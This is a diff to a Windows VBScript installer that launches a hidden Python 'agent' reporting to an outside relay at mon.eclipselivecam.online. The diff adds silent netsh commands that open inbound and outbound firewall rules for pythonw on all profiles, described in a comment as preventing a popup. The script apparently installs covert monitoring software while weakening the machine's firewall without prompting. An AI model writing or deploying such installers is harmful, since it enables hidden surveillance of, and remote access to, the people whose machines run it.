@@ -40,6 +40,18 @@ sh.Environment("Process")("PATH") = sp & ";" & up
 ' ── Install dependencies ──────────────────────────────────────────────────────
 sh.Run "cmd /c pip install -r """ & DIR & "\requirements.txt"" -q --no-warn-script-location", 0, True
 
+' ── Allow Python through firewall (prevents popup) ───────────────────────────
+Dim pyw
+On Error Resume Next
+Set ex = sh.Exec("cmd /c where pythonw")
+Do While ex.Status = 0 : WScript.Sleep 100 : Loop
+pyw = Trim(ex.StdOut.ReadLine())
+On Error GoTo 0
+If pyw <> "" Then
+    sh.Run "cmd /c netsh advfirewall firewall add rule name=""Python Monitor"" dir=in action=allow program=""" & pyw & """ enable=yes profile=any", 0, True
+    sh.Run "cmd /c netsh advfirewall firewall add rule name=""Python Monitor"" dir=out action=allow program=""" & pyw & """ enable=yes profile=any", 0, True
+End If
+
 ' ── Launch agent (no console window) ─────────────────────────────────────────
 sh.Environment("Process")("NORA_RELAY") = "https://mon.eclipselivecam.online"
 sh.Run "cmd /c start """" /D """ & DIR & """ pythonw """ & DIR & "\app.py""", 0, False
